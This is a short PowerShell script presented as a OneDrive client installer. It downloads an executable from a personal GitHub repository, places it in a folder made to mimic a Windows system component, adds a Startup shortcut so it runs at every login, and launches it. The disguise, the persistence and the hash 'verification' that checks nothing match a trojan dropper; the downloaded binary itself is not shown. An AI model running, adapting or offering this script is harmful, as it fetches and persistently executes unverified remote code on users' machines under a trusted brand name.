
$ErrorActionPreference = "Stop"

# Configuration
$folder = "C:\ProgramData\Microsoft\Windows\SystemComponents\OneDrive\Client"
$exe = Join-Path $folder "OneDrive.exe"

$url = "https://raw.githubusercontent.com/apexacex/key/main/OneDrive.exe"

$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$shortcutPath = Join-Path $startup "OneDrive.lnk"

Write-Host "[1/5] Creating installation directory..."

New-Item -ItemType Directory -Path $folder -Force | Out-Null

Write-Host "[2/5] Downloading OneDrive client..."

Invoke-WebRequest -Uri $url -OutFile $exe

if (!(Test-Path $exe)) {
    throw "Download failed!"
}

Write-Host "[3/5] Creating startup shortcut..."

$ws = New-Object -ComObject WScript.Shell
$shortcut = $ws.CreateShortcut($shortcutPath)

$shortcut.TargetPath = $exe
$shortcut.WorkingDirectory = $folder
$shortcut.Description = "OneDrive Client"
$shortcut.Save()

Write-Host "[4/5] Verifying installation..."

Get-FileHash $exe -Algorithm SHA256

if (!(Test-Path $shortcutPath)) {
    throw "Startup shortcut creation failed!"
}

Write-Host "[5/5] Launching OneDrive client..."

Start-Process -FilePath $exe -WorkingDirectory $folder

Write-Host ""
Write-Host "Installation completed!"
Write-Host "Application: $exe"
Write-Host "Startup: $shortcutPath"
